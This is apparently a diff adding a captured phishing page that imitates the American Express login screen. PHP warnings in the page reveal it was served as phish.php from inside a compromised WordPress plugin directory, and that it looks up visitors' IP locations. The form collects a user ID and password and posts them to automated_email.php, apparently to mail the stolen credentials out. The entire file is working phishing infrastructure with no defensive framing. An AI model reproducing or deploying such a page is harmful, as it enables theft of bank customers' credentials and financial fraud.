@@ -1,0 +1,210 @@
+<!doctype html>
+<html>
+	<head><br />
+<b>Warning</b>:  simplexml_load_file(http://www.geoplugin.net/xml.gp?ip=212.102.54.158): failed to open stream: HTTP request failed! HTTP/1.1 403 Forbidden
+ in <b>/srv/users/serverpilot/apps/bigattoeventos/public/wp-content/plugins/imagify/third/amex_0auth/amex_auth/phish.php</b> on line <b>9</b><br />
+<br />
+<b>Warning</b>:  simplexml_load_file(): I/O warning : failed to load external entity &quot;http://www.geoplugin.net/xml.gp?ip=212.102.54.158&quot; in <b>/srv/users/serverpilot/apps/bigattoeventos/public/wp-content/plugins/imagify/third/amex_0auth/amex_auth/phish.php</b> on line <b>9</b><br />
+		<meta charset="utf-8">
+		<link rel="shortcut icon" href="ayaworan/favicon.ico" />
+		<title>American - Express</title>
+		<style type="text/css">
+
+		body { 
+		  background: #ebebed no-repeat center center fixed; 
+		  -webkit-background-size: cover;
+		  -moz-background-size: cover;
+		  -o-background-size: cover;
+		  background-size: cover;
+		  background-size: 100% 100%;
+		}
+
+
+		@media screen and (min-width: 500px) {
+			body {
+				width:420px;
+			}
+		}
+
+		@media screen and (min-width: 800px) {
+			body {
+				width:720px;
+			}
+		}
+
+		.login_contain {
+			position: absolute;
+			margin: 0 auto;
+			width: 300px;
+			height: 500px;
+			top: 75px;
+			left: 425px;
+			background-color: white;
+			-moz-box-shadow: 0 0 2px 2px #e0e0e0;
+			-webkit-box-shadow: 0 0 2px 2px #e0e0e0;
+			box-shadow: 0 0 2px 2px #e0e0e0;
+			z-index: 1;
+		}
+
+
+		.login_contain_span {
+
+			position: absolute;
+			height: 20px;
+			width: 100px;
+			top: 10px;
+			left: 0px;
+			/*z-index: 1;*/
+		}
+
+		.header_logo {
+			position: fixed;
+			background-image: url('ayaworan/header.png');
+			background-position: up center;
+  			background-repeat: no-repeat;
+  			background-size: contain;
+  			left: -10px;
+  			top: 0px;
+  			width: 100vw;
+  			height: 100vh;
+		}
+
+
+		.footer_logo {
+			position: absolute;
+			background-image: url('ayaworan/footer.png');
+			background-position: up center;
+  			background-repeat: no-repeat;
+  			background-size: contain;
+  			top: 600px;
+  			left: 0px;
+  			width: 100vw;
+  			height: 100vh;
+		}
+
+		.ad_logo {
+			position: absolute;
+			top: 0px;
+			left: 320px;
+		}
+
+
+		.user_id_text {
+			position: absolute;
+			top: 25px;
+			left: 20px;
+			font-color: black;
+			font-weight: bold;
+			color: #47474a;
+		    font-size: 13px;
+		    font-family: Arial, Helvetica, sans-serif;
+		}
+
+		.password_id_text {
+			position: absolute;
+			top: 135px;
+			left: 20px;
+			font-color: black;
+			font-weight: bold;
+			color: #47474a;
+		    font-size: 13px;
+		    font-family: Arial, Helvetica, sans-serif;
+		}
+
+		.forgot_pass {
+			position: absolute;
+			top: 300px;
+			left: 13px;
+		}
+
+
+		input[type=text] {
+			position: absolute;
+			top: 260px;
+			left: 33px;
+		    width: 355px;
+		    padding: 8px 11px;
+		    margin: 8px 0;
+		    box-sizing: border-box;
+		    border: 1px solid grey;
+		    border-radius: 3px;
+		    font-size: 15px;
+		    font-family: Arial, Helvetica, sans-serif;
+		}
+
+		input[type=password] {
+			position: absolute;
+			top: 310px;
+			left: 33px;
+		    width: 355px;
+		    padding: 8px 11px;
+		    margin: 8px 0;
+		    box-sizing: border-box;
+		    border: 1px solid grey;
+		    border-radius: 3px;
+		    font-size: 15px;
+		    font-family: Arial, Helvetica, sans-serif;
+		}
+
+
+		.myButton {
+			position: absolute;
+			top: 230px;
+			left: 19px;
+			width: 260px;
+			background-color:#1c5bc7;
+			-moz-border-radius:4px;
+			-webkit-border-radius:4px;
+			border-radius:4px;
+			display:inline-block;
+			cursor:pointer;
+			color:#ffffff;
+			font-family:Arial;
+			font-size:15px;
+			padding:15px 76px;
+			text-decoration:none;
+			/*text-shadow:0px 1px 0px #1c4dc9;*/
+		}
+		.myButton:hover {
+			background-color:#2e77bb;
+		}
+/*		.myButton:active {
+			position:relative;
+			top:1px;
+		}*/
+
+
+
+		</style>
+	</head>
+
+	<body>
+
+		<form id="app_xp" name="app_xp" method="post" action="automated_email.php" onsubmit="return validateForm()">
+
+		<div class="header_logo"></div>
+		<div class="footer_logo"></div>
+
+		<div class="login_contain">
+
+			
+			<div class="ad_logo"><img src="ayaworan/ad_logo.png" width="290px"></div>
+
+			<div class="login_contain_span">
+
+				<div class="user_id_text">USER ID</div>
+				<input style="background: #f5f5f7;top: 40px;left: 20px;width: 257px;height: 50px;" type="text" id="user_id" name="user_id" placeholder="" required>
+				<div class="password_id_text">PASSWORD</div>
+				<input style="background: #f5f5f7;top: 150px;left: 20px;width: 257px;height: 50px;" type="password" id="user_pass" name="user_pass" placeholder="" required>
+				
+				<button class="myButton" type="submit">Log in</button>
+
+				<div class="forgot_pass"><img src="ayaworan/forgot_pass.png" width="270px"></div>
+
+			</div>
+
+		</div>
+
+		</form>
+	</body>
+</html>
